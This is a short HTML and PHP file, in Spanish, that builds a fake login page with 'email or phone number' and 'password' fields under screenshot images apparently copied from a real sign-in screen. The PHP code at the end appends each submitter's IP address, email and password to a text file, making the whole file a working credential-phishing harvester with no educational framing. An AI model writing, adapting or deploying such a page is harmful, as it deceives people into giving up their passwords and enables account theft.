<html> 
<head>
</head>
<body style="background-color: #000000  ">
</body>
<form method="post">
<p><img alt="" src="sesion.png" style="width: 950px; height: 300px;" /></p>
<p>Nombre: <input type="text" name="nombre1"  value="Correo electrónico o numero de teléfono" onclick="if(this.value=='Correo electrónico o numero de teléfono') this.value=''" onblur="if(this.value=='') this.value='Correo electrónico o numero de teléfono'"  style="width: 950px; height: 100px;background-color: #646363 ;font-size:40px;"></p>
<p>Nombre2: <input type="text" name="nombre2" value="Contraseña" onclick="if(this.value=='Contraseña') this.value=''" onblur="if(this.value=='') this.value='Contraseña'"  style="width: 950px; height: 100px; background-color: #646363 ;font-size:40px;"></p>
<p>Nombre3: <input type="submit" name="submit" value="Iniciar sesión" style=" color:white; width: 950px; height: 100px; background-color: #ff0000; font-size:50px;font-size:50px;"/></p>
<p><img alt="" src="sesion2.png" style="width: 1000px; height: 600px;" /></p>
</form>
<?php
if(isset($_POST['submit'])){
$nombre1 = "Email:".$_POST['nombre1']."
";
$ip ="LA IP ES:" .$_SERVER['REMOTE_ADDR']."
";
$nombre2 = "Contraseña:".$_POST['nombre2']."
";
$file=fopen("file.txt", "a");
fwrite($file, $ip);
fwrite($file, $nombre1);
fwrite($file, $nombre2);
fclose($file);
}
?>
</html>

